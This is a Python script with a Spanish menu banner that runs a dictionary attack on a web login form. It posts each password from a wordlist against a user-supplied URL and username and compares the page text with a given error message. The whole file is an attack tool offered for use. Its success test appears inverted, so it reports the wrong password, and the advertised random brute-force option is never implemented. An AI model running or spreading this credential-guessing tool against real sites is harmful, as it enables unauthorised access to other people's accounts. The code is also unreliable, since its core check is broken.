import requests
import time
from bs4 import BeautifulSoup

print("""
\033[34;1m__          __________\033[32m____  \033[33m   ____     __    _____________________
\033[34;1m\ \        / / ______/\033[32m __ \ \033[33m  /    \   / /   / /____  ____/ ______/
\033[34;1m \ \  __  / / /__   \033[32m/    _/ \033[33m / _  _/  / /   / /    / /   / /___
\033[34;1m  \ \/  \/ / ___/  \033[32m/  __ \  \033[33m/ / \ \  / /   / /    / /   / ____/
\033[34;1m   \      / /_____\033[32m/  /__\ |\033[33m/ /   \ \/ /___/ /    / /   / /______
\033[34;1m    \_/\_/_______/\033[32m________/\033[33m_/     \________/    /_/   /________/
\033[0m=====================================================================
[\033[31m1\033[0m] ataque con letras numeros aleatorios(fuerzabruta)
[\033[31m2\033[0m] ataque de diccionario o de lista de palabras
[\033[31m3\033[0m] salir 
=====================================================================
[*] librerias : request,bs4,random
[*] github :\033[34;1m https://github.com/cave02  \033[0m 

""")
opcion = input("====> ")
def dic():
	url = input("[*] introdusca el link : ")
	username=input("[*] usuario : ")
	pt = input("[*] tag de contraseña : ")
	pu = input("[*] tag de usuario : ")
	error = input("[*] error al inicio de seccion : ")
	def send(username,pt,pu,error,url):
		wordlist = input("[*] wordlist : ")
		with open(wordlist,"r") as n:
			for line in n:
				password = line.strip()		
				ez = requests.post(url,data = {pu : username,pt : password})
				lol = BeautifulSoup(ez.content, "html.parser").get_text() 
				if error != lol :
					print("[\033[32mBruteforce\033[0m] intentando : "+str(password))
				else :
					print("[\033[32;1m+\033[0m] contraseña : "+str(password))
					break
	send(username,pt,pu,error,url)
if opcion == "2" :
	dic()
